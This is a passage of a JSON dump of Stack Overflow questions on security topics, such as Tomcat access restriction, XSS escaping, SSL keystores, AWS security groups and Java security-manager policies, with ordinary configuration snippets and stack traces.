java.lang.Thread.run(Thread.java:680)\n</code></pre>\n\n<p>I know that the full stack wasn't needed, but anyways...</p>\n\n<p>Thanx much in advance.</p>\n\n<p>Joao</p>\n"},{"tags":["security","networking","sip"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13230416,"title":"Eavesdropping in SIP Communication","body":"<p>For a school project, I need to make an eavesdropping experiment between a SIP user agent and a SIP server. The experiment has to include the following steps:</p>\n\n<pre><code>  i)Establish a voice/data communication between two SIP agent.\n\n  ii) Capture the signal (i.e. SIP packets) in wireshark.\n\n  iii) Change the content of the signal via wireshark or some \n  other tool that fits better to this purpose.\n\n  iv) Encrypting/securing the communication between the agents somehow \n  to avoid third parties (e.g. wireshark to eavesdrop the communication) \n   from eavesdropping.\n</code></pre>\n\n<p>Could you please tell me if there are tools for simulating the above scenario? I prefer to do this programmatically actually and I know there is an open source SIP stack named resip (resiprocate.org) which provides an example user agent and server already in C++. Can I simulate this scenario programmatically or it's better to use some tools that can do this? Thanks in advance. </p>\n"},{"tags":["android","security","components","android-permissions"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13233332,"title":"Android Privilege escalations","body":"<p>Does android components have different permissions than the application itself and is it possible to attack an application having some permissions by an app that doesn't have that permissions. More can be read <a href=\"https://docs.google.com/viewer?a=v&amp;q=cache%3aV1Ohw6FPZA8J%3awww.ei.rub.de/media/trust/veroeffentlichungen/2010/11/13/DDSW2010_Privilege_Escalation_Attacks_on_Android.pdf%20&amp;hl=en&amp;gl=in&amp;pid=bl&amp;srcid=ADGEESg-bJnNxwXW2hcTO9Ig5Zhi3JMEwKUGnEhJ_SbLJ3ETR_7iV-I58yV35te_GZoFBF5FOPBpBboBKSgbTYpNQ_myGqAHNno_gqifgHWcoNMdCdHw-vUzf_3b9VNQDr4EJpo4KPBG&amp;sig=AHIEtbQnwdUDOBjOuxPBABcAD0Oo3IjogQ\" rel=\"nofollow\">here, section 3</a>.</p>\n"},{"tags":["security","tomcat","webserver","tomcat6"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2681,"score":3,"question_id":5224106,"title":"Tomcat: Restrict access to localhost for /just one/ webapp","body":"<p>I'm running Tomcat 6 to serve several web apps, most of which are public-facing.  But I'd like to restrict access to <em>just one</em> webapp, allowing connections only from localhost.</p>\n\n<p>I can restrict access for <em>all</em> webapps using a valve in context.xml, as described in:</p>\n\n<ul>\n<li><a href=\"http://stackoverflow.com/questions/3381531/tomcat-restrict-access-by-ip-address\">Tomcat Restrict access by IP address</a></li>\n</ul>\n\n<p>But I can't figure out how to restrict access on a per-app basis.  Is there a way to do this with my app's web.xml?  Or by adding additional rules to context.xml?</p>\n\n<p>Thanks,</p>\n\n<p>-B</p>\n\n<hr>\n\n<h1>Recapping Solution:</h1>\n\n<pre><code>$ cp /var/lib/tomcat6/conf/context.xml \\ \n   /var/lib/tomcat6/conf/Catalina/localhost/my-app-name.xml\n\n$ cat /var/lib/tomcat6/conf/Catalina/localhost/my-app-name.xml\n\n&lt;Context&gt;\n    &lt;Valve className=\"org.apache.catalina.valves.RemoteHostValve\" allow=\"localhost\"/&gt;\n... {as previously} ...\n&lt;/Context&gt;\n</code></pre>\n"},{"tags":["php","apache","security","webserver"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13232622,"title":"Separate apache sites with security in mind","body":"<p>I have one machine running apache with php. It serves multiple domains from the folder /home/web/\nLike /home/web/domainA and /home/web/domainB</p>\n\n<p>Now, how do I securely separate them? Domain A must not be able to read, write or execute files in domain B's folder.</p>\n\n<p>A virtual server is not a (well liked) option, since the server is low on RAM, and avoiding multiple boxes is preferable..</p>\n"},{"tags":["android","iphone","security","testing","security-testing"],"answer_count":0,"favorite_count":2,"up_vote_count":0,"down_vote_count":4,"view_count":35,"score":-4,"question_id":13232851,"title":"Tool For Ipad and Android application Testing","body":"<p>I have developed the application in I phone and Android. Now I have to check the security issues. So Please suggest me the tool for security testing for I phone and android application  testing.</p>\n\n<p>Thanks In Advance.</p>\n"},{"tags":["security","jsf","authentication","web-applications","java-ee-6"],"answer_count":4,"favorite_count":65,"up_vote_count":52,"down_vote_count":0,"view_count":42458,"score":52,"question_id":2206911,"title":"Best way for user authentication on JavaEE 6 using JSF 2.0?","body":"<p>I'm wondering what the current state of art recommendation is regarding user authentication for a web application making use of JSF 2.0 (and if any components do exist) and JEE6 core mechanisms (login/check permissions/logouts) with user information hold in a JPA entity. The Sun tutorial is a bit sparse on this (only handles servlets).</p>\n\n<p>This is without making use of a whole other framework, like Spring-Security (acegi), or Seam, but trying to stick hopefully with the new Java EE 6 platform (web profile) if possible.</p>\n\n<p>Thanks,\nNiko</p>\n"},{"tags":["java","security","access-denied","lotus-domino"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":4380,"score":1,"question_id":2635881,"title":"Error: java.security.AccessControlException: Access denied","body":"<p>I have to connect to a https URL with username and password to read a file. I am not able to connect to the server (see the error log below). I do not have much Java experience, so I need help with this code.</p>\n\n<pre><code>import lotus.domino.*;\nimport java.net.*;\nimport java.io.*;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class JavaAgent extends AgentBase {\n\npublic void NotesMain() {\n\n  try {\n    String username = \"123\";\n    String password = \"456\";\n    String input = username + \":\" + password;\n    String encoding = new sun.misc.BASE64Encoder().encode (input.getBytes());\n\n    //Open the URL and read the text into a Buffer\n    String urlName = \"https://server.org/Export.mvc/GetMeetings?modifiedSince=4/9/2010\";\n    URL url = new URL(urlName);\n    HttpsURLConnection connection = (HttpsURLConnection)url.openConnection();\n\n    connection.setRequestMethod(\"POST\");\n    connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n    connection.setRequestProperty(\"Content-Length\", String.valueOf (encoding.length())); \n    connection.setUseCaches(false);\n    connection.setDoInput(true);\n    connection.setDoOutput(true);\n    connection.setAllowUserInteraction(true);\n    connection.setRequestProperty(\"Authorization\", \"Basic \" + encoding);\n    connection.setRequestProperty(\"Cookie\", \"LocationCode=Geneva\");\n\n    connection.connect();\n\n    BufferedReader rd = null;\n      try{\n        rd = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n      } catch (IOException e) {\n        System.out.println(\"Read failed\");\n        System.exit(-1);\n      }\n\n    String line;\n    while((line = rd.readLine()) != null) {\n      System.out.println(line.toString());\n    }\n    rd.close();\n\n    connection.disconnect();\n\n  } catch(Exception e) {\n    e.printStackTrace();\n  }\n}\n}\n</code></pre>\n\n<p>Exception thrown:</p>\n\n<pre><code>java.security.AccessControlException: Access denied (java.lang.RuntimePermission exitVM.-1)\n at java.security.AccessController.checkPermission(AccessController.java:108)\n at java.lang.SecurityManager.checkPermission(SecurityManager.java:532)\n at COM.ibm.JEmpower.applet.AppletSecurity.superDotCheckPermission(AppletSecurity.java:1449)\n at COM.ibm.JEmpower.applet.AppletSecurity.checkRuntimePermission(AppletSecurity.java:1311)\n at COM.ibm.JEmpower.applet.AppletSecurity.checkPermission(AppletSecurity.java:1611)\n at COM.ibm.JEmpower.applet.AppletSecurity.checkPermission(AppletSecurity.java:1464)\n at java.lang.SecurityManager.checkExit(SecurityManager.java:744)\n at java.lang.Runtime.exit(Runtime.java:99)\n at java.lang.System.exit(System.java:275)\n at JavaAgent.NotesMain(Unknown Source)\n at lotus.domino.AgentBase.runNotes(Unknown Source)\n at lotus.domino.NotesThread.run(Unknown Source)\n</code></pre>\n"},{"tags":["security","mdx","role","ssas-2008"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13170326,"title":"MDX Expression to restrict access to Measure Group","body":"<p>Say I have a bunch of measures which I wanted certain people to be unable to see (or vice versa only allow them to see) what kind MDX expression would I add to the SSAS Role?</p>\n\n<p>I can get the user identity through the USERNAME function.</p>\n\n<p>Is it even possible? </p>\n\n<p>I can easily construct Dimension based security expressions, but I can't see how the Measures dimension access can be similarly curtailed.</p>\n"},{"tags":["php","security","escaping","xss"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13199095,"title":"Escaping variables","body":"<p>I've read that it's enough and even recommended to escape characters on the output, not on the input.</p>\n\n<p>It could be easily applied to all get variables as they are not injected to the database from the form level.</p>\n\n<p>However, I'm not sure what to do with all post variables. If it doesn't come from the database, so if it's a raw input data, escaping is fully needed. But I'm using PDO prepare/execute to escape all variables. Questions now:</p>\n\n<ol>\n<li>Is it OK to use PDO's prepare/execute both in select and insert statements? Isn't it escaping variables twice ?</li>\n<li>Let's say I get some variable through PDO exeute statement - is it ok to display this variable simply with $_POST['variable'] without escaping it (if it was already done in PDO function) ?</li>\n<li>Is htmlspecialchars() enough to escape things such as GET variables which don't come from the database?</li>\n</ol>\n\n<p>And the most important - is all of this, PDO prepare/execute, and htmlspecialchars(), enough to prevent all XSS attacks? Or should I also do more? If so, what should this be? Removing all html tags from the input? Using BB-Code instead?</p>\n"},{"tags":["android","security","sockets","ssl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13198379,"title":"SSL certificate Android","body":"<p>I have a problem with importing certificate to application.\nI have created BKS keystore with keytool. I put it to res/raw folder. \nI'm able to load it to Android.</p>\n\n<pre><code>InputStream inputStream = context.getResources().openRawResource(R.raw.enigma);\nKeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\nkeyStore.load(inputStream, \"android\".toCharArray());\ninputStream.close();\n\nString algorithm = KeyManagerFactory.getDefaultAlgorithm();\nKeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(algorithm);\nkeyManagerFactory.init(keyStore, \"android\".toCharArray());\n</code></pre>\n\n<p>When I try to call SSLServerSocket.accept() then, I receive an Exception: \"SSLException: Could not find any key store entries to support the enabled cipher suites\".</p>\n\n<p>What can be wrong? Is there tutorial for creating KeyStore on Android.</p>\n\n<p>Thanks</p>\n"},{"tags":["asp.net","security","iis"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13224202,"title":"What user is my app using to access the file system?","body":"<p>I have an application that is getting a <code>System.UnauthorizedAccessException</code> error when it tries to read from the file system.</p>\n\n<p>I looked at the app pool and I see that is using <code>Network Service</code> for it's identity.  The IIS application is allowing anonymous authentication using an existing account, lets call it <code>IUSR-MYSERVER</code>.  It also has <code>Integrated Windows authentication</code> enabled.</p>\n\n<p>If I go to the folder in question and Add <code>Everyone</code> with Read+Execute permissions the error goes away.  But if I add <code>IUSR-MYSERVER</code> or <code>NETWORK SERVICE</code> with the same permissions, I still get the same error.</p>\n\n<p>When I look at the error's entry in my Event Log it has the User as <code>N/A</code>.</p>\n\n<p>What user is my application trying to access the file system as?  I assume it would be bad to just use <code>Everyone</code>?  </p>\n"},{"tags":["java","security","ssl","websphere","portlet"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13229317,"title":"How to obtain private key from secure request in Websphere portlet?","body":"<p>In my Spring MVC portlet users have to digitally sign documents and send an application. User certificate (PKCS#12) is added to the browser certificates. Portal has SSL configured as supported and I'm able to obtain X509Certificate by: </p>\n\n<pre><code>private static final String SSL_CERT = \"javax.servlet.request.X509Certificate\";\n\nX509Certificate[] certificates = (X509Certificate[]) request\n    .getAttribute(SSL_CERT);\n</code></pre>\n\n<p>As private key is required to generate a digital signature, can anyone please suggest how I can obtain client's private key?</p>\n"},{"tags":["security","http","webserver","cross-domain","httprequest"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13227014,"title":"Cross domain requests from the server","body":"<p>I know that browsers often prevent cross domain http requests to servers due to security measures (which can be avoided by CORS or JSONP), but what about a server making an http request to another server? Can that be blocked by security restrictions?</p>\n\n<p>I guess what I'm asking is that since the server is making the request and not the browser, would I still need to deal with things such as CORS and/or JSONP, or are those work arounds specifically geared towards browser-level security?</p>\n"},{"tags":["c#","security","securestring"],"answer_count":5,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":2279,"score":9,"question_id":2420122,"title":"Using SecureString","body":"<p>Can this be simplified to a one liner? Feel free to completely rewrite it as long as secureString gets initialized properly.</p>\n\n<pre><code>SecureString secureString = new SecureString ();\nforeach (char c in \"fizzbuzz\".ToCharArray())\n{\n    secureString.AppendChar (c);\n}\n</code></pre>\n"},{"tags":["javascript","security","microsoft-metro"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13219893,"title":"In Windows Store/Metro Apps: the Web Context is the sandbox, but who enforces it?","body":"<p>After reading the MSDN article <a href=\"http://msdn.microsoft.com/en-gb/magazine/jj721591.aspx\" rel=\"nofollow\">Web to Windows 8: Security</a> (by Tim Kulp) I have a main question which is:</p>\n\n<p><strong>'The the Web Context is the sandbox, but who enforces it?'</strong></p>\n\n<p>This can be further expanded into:</p>\n\n<ul>\n<li>Who is actually enforcing this Sandbox? the browser? the Javascript engine, a javascript APIs? the windows process?</li>\n<li>What are the communication possibilities between the Web and Local contexts?</li>\n<li>Is there an CAS-Like security demands architecture that declares and enforces Code Access Security on specific functions (or assets)?</li>\n<li>Aren't they both (Web and Local contexts) javascript/html code that is running on the same browser session? (and OS process)?</li>\n<li>Isn't there a gazillion of objects (think Html elements and Javascript variables/objects) that are shared between them?</li>\n<li>How does this play with the powerful javascript capabilties to 'bend reality' and change just about everything (for example prototypes)?</li>\n<li>What are the rules-of-engagement for the Javascript this object?</li>\n<li>What about all those Html 5 security issues?</li>\n<li>Are there any SAST (static code analysis) tools that can scan these Windows Store Apps and identify security issues?</li>\n<li>Is this a javascript sandbox for javascript code? That is a hard one to pull off (and if so, surely Microsoft must have changed the way its Javascript's engine works)</li>\n</ul>\n\n<p>Note: For a longer version of this post see the  <a href=\"http://diniscruz.blogspot.co.uk/2012/11/windows-storemetro-apps-client-server.html\" rel=\"nofollow\">Windows Store/Metro Apps - A 'client-server' sandbox built using Javascript?</a> blog post </p>\n"},{"tags":["php","security","plugins","web-security","tracking"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":16,"score":-1,"question_id":13223446,"title":"open source web development plugins,scripts store information?","body":"<p>I'm wondering if open source plugins like wordpress,drupal, jquery and others  detect for example what websites are using their plugin.</p>\n\n<p>Something like google analitycs but for tracking websites.</p>\n\n<p>I'm asking this because I see this on the plugins official websites :</p>\n\n<blockquote>\n  <p>USED BY : X, Y, Z and many more (see full list...) </p>\n</blockquote>\n\n<p>If so, is there any plugin which can detect which website is using your script/plugin.</p>\n\n<p>If you have any idea, suggestions ...</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","security","api","cakephp"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13222171,"title":"I have a php application that checks, through an api, if the user is entitled to use it! How should I hide the check from crackers?","body":"<p>As I stated in my title: I have a php application, developed in cake 2.*, that before each use checks with my server if it is ok to run.</p>\n\n<p>This is done because the app is a module part of a bigger project and it is sold for one time use.</p>\n\n<p>The thing is that, if a developer wants to, he can manually remove the check function from the project. It is implemented only in beforeFilter in AppController.\nI thought about making every action dependent on this check but this would just increase the time a developer needs to remove it, as well as the time of response. I thought about writing it in the core of cake, but it is visible with a debugger. Also this actions wouldn't be a solution.</p>\n\n<p>However complicated I think the authorization process the problem that I can't solve is how to obfuscate the process.</p>\n\n<p>Al that I need, as I use a txt file for the authorization process, is to make the application somehow dependent to this txt file.\nI thought about writing part of an important file in this txt and encrypt it. Like this I would make the user request the auth key from my server so he can snatch the php.\nThe thing is that this could be deployed on a shared hosting, with minimal access to commands(in general is gpg available for users on shared hosting? can users run cake bash scripts on shared hosting?).</p>\n\n<p><strong>EDIT:</strong></p>\n\n<ul>\n<li>The users know that it needs an online connection;</li>\n<li>The system also generates a uniq code based on a <strong>serial key</strong>; </li>\n<li>Users ask for auth->email, domain, uniq code->my server calculates the uniq code based on some local data that it has about the user, it uses also the email and domain sent. It compares the uniq code obtained with the one sent->sends auth;</li>\n<li>There isn't much hassle added to the paying customers as they don't have to do a thing. But if they think about making the app public or reuse it a developer could achieve that.</li>\n</ul>\n"},{"tags":["security","symfony2","symfony-sonata"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":218,"score":0,"question_id":10911188,"title":"SonataAdminBundle Security roles","body":"<p>I'm trying to secure some admin in SonataAdminBundle</p>\n\n<p>I add SonataUserBundle with fosUserBundle for login.\nSo I can add users, groups and roles</p>\n\n<p>in security.yml</p>\n\n<pre><code>role_hierarchy:\n    ROLE_ADMIN: ROLE_ADMIN\n    ROLE_IT: ROLE_IT\n    ROLE_SUPER_ADMIN: [ROLE_ADMIN, ROLE_IT]\n\n\naccess_control:\n    - { path: ^/sonata/login$, role: IS_AUTHENTICATED_ANONYMOUSLY }\n    - { path: ^/sonata/logout$, role: IS_AUTHENTICATED_ANONYMOUSLY }\n    - { path: ^/sonata/login-check$, role: IS_AUTHENTICATED_ANONYMOUSLY }\n    - { path: ^/sonata, role: [ROLE_ADMIN] }\n    - { path: ^/sonata/api/monolog, role: [ROLE_IT] }\n</code></pre>\n\n<p>I have to be connected to access Sonata</p>\n\n<p>But every user can access the route /sonata/api/monolog even if they don't have ROLE_IT</p>\n\n<p>How can I securize an Admin\nAnd how can I only display the link if the user can acces to it</p>\n"},{"tags":["linux","security","networking","debian","ports"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13219869,"title":"in computer security What ports are considered to be dangerous?","body":"<p>im performing a debian 6 machine scan using nmap\nim listing all open ports and OS\nout of the ports im getting back\ni want to know what open ports are considered to be dangerous</p>\n\n<p>the ports i have:\n22 and 111 if these listed are not dangerous which i think are not.\nwhich ones are know to be dangerous? </p>\n"},{"tags":["security","drupal","search","google","private"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":207,"score":0,"question_id":4799083,"title":"google search engine inside my drupal / site without show the content to worldwide?","body":"<p>i have a site that im developing and i want to put there content and links (some of them are my private home links and stuff) drupal search is good, but its not accurate and also its shows me only things from my site... i want to search all include my website, but dont let google to public it world wide... is taht possible?</p>\n"},{"tags":["security","networking","amazon-web-services"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13213897,"title":"AWS Security Group Not Permitting Inbound Traffic","body":"<p>I want to allows nodes in the <code>app-server</code> group talk to mysql and redis machines in the <code>database</code> group.  However,  I can only make explicit IPs work for ingress rules.  When I try to define groups instead, to make auto-scaling easier, the traffic is blocked.</p>\n\n<p><em>Here's my setup</em>:</p>\n\n<p>When I run</p>\n\n<p><code>ec2-describe-group database</code></p>\n\n<p>I get</p>\n\n<pre><code>PERMISSION      890752071609    database        ALLOWS  tcp     3306    3306    FROM    USER    890752071609    NAME default    ID sg-5ce3766c  ingress\nPERMISSION      890752071609    database        ALLOWS  tcp     3306    3306    FROM    USER    890752071609    NAME app-server ID sg-b81b8088  ingress\nPERMISSION      890752071609    database        ALLOWS  tcp     6379    6379    FROM    USER    890752071609    NAME default    ID sg-5ce3766c  ingress\nPERMISSION      890752071609    database        ALLOWS  tcp     6379    6379    FROM    USER    890752071609    NAME app-server ID sg-b81b8088  ingress\nPERMISSION      890752071609    database        ALLOWS  tcp     0       65535   FROM    USER    890752071609    NAME database   ID sg-d262f1e2  ingress\nPERMISSION      890752071609    database        ALLOWS  tcp     22      22      FROM    CIDR    0.0.0.0/0       ingress\n</code></pre>\n\n<p>However, when I try to connect to port 6379 using redis-cli from a machine in the <code>app-server</code> group, I get a redis timeout error.</p>\n\n<p>If I explicitly add the elastic IP of the server I want to connect from, like this</p>\n\n<pre><code>PERMISSION      890752071609    database        ALLOWS  tcp     3306    3306    FROM    CIDR    111.snip.25/32        ingress\nPERMISSION      890752071609    database        ALLOWS  tcp     6379    6379    FROM    CIDR    222.snip.25/32        ingress\n</code></pre>\n\n<p>the redis-cli call works.  However, I want to be more flexible, and add the entire security group instead.</p>\n\n<p>The <a href=\"http://docs.amazonwebservices.com/AWSEC2/latest/UserGuide/using-network-security.html#security-group-examples\" rel=\"nofollow\">amazon docs</a> state</p>\n\n<blockquote>\n  <p>By specifying a security group as the source, you allow incoming traffic from all instances that belong to the source security group. The incoming traffic that you allow is based on the private IP addresses of the instances in the source security group. You might specify another security group in your account if you're creating a three-tier web service (see Creating a Three-Tier Web Service).</p>\n</blockquote>\n\n<p>This should work, no?  What am I doing wrong?</p>\n"},{"tags":["java","security","applet"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13217050,"title":"how to make simple applet run without permission","body":"<p>I have created an applet and it doesn't access any client files or resources. So in my understanding i don't need to sign it.</p>\n\n<p>I am going to host that applet along with my website. My problem is that whenever browser runs that applet at start up it ask for permission. I want the applet to run without such permission.</p>\n\n<p>I have seen other applets that runs automatically in my browser.</p>\n\n<p>It's a simple applet, how can I achieve this?.</p>\n"},{"tags":["security","file-upload","amazon-s3"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":395,"score":0,"question_id":4820077,"title":"Questions regarding uploading files to Amazon S3 using browser based HTTP POST","body":"<p>I have a couple of questions regarding uploading files to Amazon S3 directly by the user using HTTP POST form generated by a JSP page</p>\n\n<ul>\n<li><p>The access key and the signature\nneeds to be exposed to the user to\nallow him to upload files from a JSP\nform. In the signature I have to set\nthe expiration time or else by\ndefault it’s valid for 15 minutes.</p>\n\n<p>i) Can the user use these details to    upload to S3 outside my portal to    update his files or update/modify    others files.</p>\n\n<p>ii). How can I set the policy to avoid this ?</p></li>\n<li><p>Can the user use the signature for\nmultiple requests ? If yes how to\nstop the user from doing multiple\nuploads ? How do I ensure that the\nuser can use this signature with a\nrequest only once ?</p></li>\n<li><p>Sometimes there might be problems at\nAmazon S3 with latencies and uploads.\nIf the response from S3 takes time\nand the user tries to upload the file\nagain. He will receive a exception,\nhow can I handle this ?</p></li>\n</ul>\n\n<p>thanks</p>\n"},{"tags":["asp.net","security","eventvalidation"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3174,"score":1,"question_id":5764875,"title":"se the ClientScriptManager.RegisterForEventValidation method in order to register the postback or callback data for validation","body":"<p>guys, I have a usercontrol in my asp.net 3.5 application and I am passing some plain text on button click event. button is situated in the usercontrol. but when I fire the event, I am getting the following error;</p>\n\n<blockquote>\n  <p>Invalid postback or callback argument.\n  Event validation is enabled using\n  \n  in configuration or &lt;%@ Page\n  EnableEventValidation=\"true\" %> in a\n  page.  For security purposes, this\n  feature verifies that arguments to\n  postback or callback events originate\n  from the server control that\n  originally rendered them.  If the data\n  is valid and expected, use the\n  ClientScriptManager.RegisterForEventValidation\n  method in order to register the\n  postback or callback data for\n  validation.</p>\n</blockquote>\n\n<p>when I set the EnableEventValidation=\"false\" to web form page like blow. it fires the event;</p>\n\n<pre><code>&lt;%@ Page EnableEventValidation=\"false\" %&gt;\n</code></pre>\n\n<p>but I am thinking that it shouldn't be a good idea to set that false. So, what is the alternative here? there error saying that <strong><em>'use the ClientScriptManager.RegisterForEventValidation method in order to register the postback or callback data for validation.</em></strong>' but where am I gonna register that thing? thanks !</p>\n\n<p>Also, I am using some AjaxControlToolkit controls inside my usercontrol and some jquery stuff.</p>\n"},{"tags":["ruby-on-rails","security","github","privacy"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":179,"score":2,"question_id":5047864,"title":"What tools do you use to avoid accidently pushing private information to a github repo on a rails project?","body":"<p>Are there any tools you use to scrub your project before pushing to a public github repo. How do you maintain your private settings, while pushing your source code to a public repo? What is the best practice?</p>\n"},{"tags":["c#","html","asp.net-mvc","security"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":72,"score":3,"question_id":13212097,"title":"Can I securely replace new lines with break tags like this?","body":"<p>Can I securely replace <code>Environment.NewLine</code> with <code>&lt;br /&gt;</code> like I am in the following extension method?</p>\n\n<pre><code>public static string HtmlBreaks(this string s)\n{\n    if (string.IsNullOrEmpty(s)) { return s; }\n    return s.Replace(Environment.NewLine, \"&lt;br /&gt;\");\n}\n</code></pre>\n\n<p>I use it like this:</p>\n\n<pre><code>@Html.Raw(Model.Details.HtmlBreaks())\n</code></pre>\n\n<p>And let me be clearer. <strong><em>Is this secure?</em></strong> <em><strong>Am I breaking any internet security guidelines by replacing text with HTML and then issuing the <code>Raw</code> method?</em></strong> Am I opening this website up to any attacks by this?</p>\n"},{"tags":["java","mysql","security","hibernate","tomcat"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1049,"score":1,"question_id":6290015,"title":"Tomcat security manager - c3p0 and hibernate","body":"<p>I am using a Tomcat security enabled server, and Hibernate3 with c3p0.\nHere are my policies in catalina.policy (I found these lines on the net and changed a bit):</p>\n\n<pre><code>grant codeBase \"file:${catalina.base}/webapps/omiccir/-\" \n{\n\n    /////////////// FilePermission ////////// \n    permission java.io.FilePermission \"${catalina.home}/log4j.properties\", \"read\"; \n    permission java.io.FilePermission \"${catalina.home}/logging.properties\", \"read\"; \n    permission java.io.FilePermission \"${catalina.home}/hibernate.properties\", \"read\"; \n    permission java.io.FilePermission \"${java.home}/lib/xerces.properties\", \"read\"; \n    //permission java.io.FilePermission \"opproject.log\", \"write\"; \n    //permission java.io.FilePermission \"${catalina.home}/Onepoint Project Home/-\", \"read, write, delete\"; \n\n\n    // FIXME line below is VERY system specific, take care! \n    permission java.io.FilePermission \"/tmp/tomcat6-tmp\", \"write\"; \n\n\n    // thought it was java.io.tmpdir, but may be wrong // \n    permission java.io.FilePermission \"${java.io.tmpdir}/tomcat6-tmp\", \"write\"; \n\n\n    /////////////// LoggingPermission ////////// \n    permission java.util.logging.LoggingPermission \"control\"; \n\n\n    /////////////// PropertyPermission ////////// \n    permission java.util.PropertyPermission \"org.apache.cxf.Logger\", \"read\"; \n    permission java.util.PropertyPermission \"org.apache.commons.logging.*\", \"read\"; \n    permission java.util.PropertyPermission \"log4j.*\", \"read\"; \n    permission java.util.PropertyPermission \"logger.home\", \"read\"; \n    permission java.util.PropertyPermission \"user.*\", \"read\"; \n    permission java.util.PropertyPermission \"org.apache.xerces.*\", \"read\"; \n    permission java.util.PropertyPermission \"ONEPOINT_PROJECT_HOME\", \"read\"; \n    permission java.util.PropertyPermission \"com.sun.xml.bind.v2.*\", \"read\"; \n    permission java.util.PropertyPermission \"com.sun.xml.bind.v2.runtime.JAXBContextImpl.fastBoot\", \"write\"; \n    permission java.util.PropertyPermission \"cglib.debugLocation\", \"read\"; \n    permission java.util.PropertyPermission \"org.dom4j.*\", \"read\"; \n    permission java.util.PropertyPermission \"c3p0.*\", \"read\"; \n    permission java.util.PropertyPermission \"net.sf.ehcache.*\", \"read\"; \n    permission java.util.PropertyPermission \"ANTLR_DO_NOT_EXIT\", \"read\"; \n    permission java.util.PropertyPermission \"ANTLR_USE_DIRECT_CLASS_LOADING\", \"read\"; \n\n\n    /////////////// RuntimePermission ////////// \n    permission java.lang.RuntimePermission \"accessClassInPackage.sun.jdbc.odbc\"; \n    permission java.lang.RuntimePermission \"accessClassInPackage.org.apache.tomcat.util.http\"; \n    permission java.lang.RuntimePermission \"accessClassInPackage.org.apache.tomcat.util.http.res\"; \n    permission java.lang.RuntimePermission \"accessClassInPackage.sun.reflect.generics.reflectiveObjects\"; \n    permission java.lang.RuntimePermission \"accessClassInPackage.sun.util.calendar\"; \n    permission java.lang.RuntimePermission \"defineClassInPackage.java.lang\"; \n    permission java.lang.RuntimePermission \"getClassLoader\"; \n    permission java.lang.RuntimePermission \"getProtectionDomain\"; \n\n\n\n    /////////////// ReflectPermission ////////// \n    permission java.lang.reflect.ReflectPermission \"suppressAccessChecks\"; \n\n    permission java.net.SocketPermission \"*\", \"resolve\"; \n    permission java.net.SocketPermission \"localhost:5432\", \"connect,resolve\"; \n\n    //What is this line??\n    //permission java.net.SocketPermission \"www.onepoint.at:80\", \"connect,resolve\"; \n\n\n    /////////////// MBean...Permission ///////// \n    permission javax.management.MBeanServerPermission \"createMBeanServer\"; \n    permission javax.management.MBeanPermission \"com.mchange.v2.c3p0.*\", \"*\"; \n    permission javax.management.MBeanTrustPermission \"register\"; \n\n\n    permission java.util.PropertyPermission \"*\", \"read,write\"; \n}\n</code></pre>\n\n<p>I don't know what is wrong, but it seems that there is a problem with c3p0, and this goes away when I use Tomcat without a security manager.</p>\n\n<p>This is my stack trace:</p>\n\n<pre><code>org.apache.jasper.JasperException: org.hibernate.exception.GenericJDBCException: Cannot open connection\n    org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:491)\n    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:419)\n    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)\n    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:269)\n    java.security.AccessController.doPrivileged(Native 